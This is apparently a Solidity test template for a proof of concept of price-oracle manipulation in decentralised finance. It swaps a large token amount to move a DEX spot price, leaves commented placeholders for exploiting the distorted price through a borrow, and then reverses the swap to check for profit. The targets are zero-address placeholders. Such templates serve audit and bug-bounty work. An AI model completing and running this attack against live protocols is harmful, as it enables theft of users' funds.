// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./BaseTest.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory);
}

/// @notice Oracle manipulation PoC template.
/// Tests if spot-price-based oracles can be manipulated via large swaps.
/// TODO: Replace with protocol-specific oracle and DEX addresses.
contract OracleManipulationTest is BaseTest {
    // TODO: Set protocol-specific addresses
    address constant DEX_ROUTER = address(0);  // TODO: Uniswap/Sushi router
    address constant TOKEN_A = address(0);      // TODO: input token
    address constant TOKEN_B = address(0);      // TODO: output token
    address constant TARGET_ORACLE = address(0); // TODO: oracle being manipulated
    address constant TARGET_PROTOCOL = address(0); // TODO: protocol using the oracle
    uint256 constant SWAP_AMOUNT = 10_000_000e18; // TODO: amount to move price

    function _labelContracts() internal override {
        vm.label(DEX_ROUTER, "DexRouter");
        vm.label(TARGET_ORACLE, "Oracle");
        vm.label(TARGET_PROTOCOL, "Protocol");
    }

    function test_oracleManipulation() public {
        _dealToken(TOKEN_A, address(this), SWAP_AMOUNT * 2);
        IERC20(TOKEN_A).approve(DEX_ROUTER, type(uint256).max);
        IERC20(TOKEN_B).approve(DEX_ROUTER, type(uint256).max);

        // TODO: Read oracle price BEFORE manipulation
        // uint256 priceBefore = IOracle(TARGET_ORACLE).getPrice();

        // Step 1: Large swap to move spot price
        address[] memory path = new address[](2);
        path[0] = TOKEN_A;
        path[1] = TOKEN_B;
        IRouter(DEX_ROUTER).swapExactTokensForTokens(
            SWAP_AMOUNT, 0, path, address(this), block.timestamp
        );

        // TODO: Read oracle price AFTER manipulation
        // uint256 priceAfter = IOracle(TARGET_ORACLE).getPrice();

        // TODO: Exploit the manipulated price
        // IProtocol(TARGET_PROTOCOL).borrow(...);

        // Step 2: Reverse swap to restore price
        uint256 tokenBBal = IERC20(TOKEN_B).balanceOf(address(this));
        path[0] = TOKEN_B;
        path[1] = TOKEN_A;
        IRouter(DEX_ROUTER).swapExactTokensForTokens(
            tokenBBal, 0, path, address(this), block.timestamp
        );

        // TODO: Assert profit
        // assertGt(profit, 0, "Attack should be profitable");
    }
}
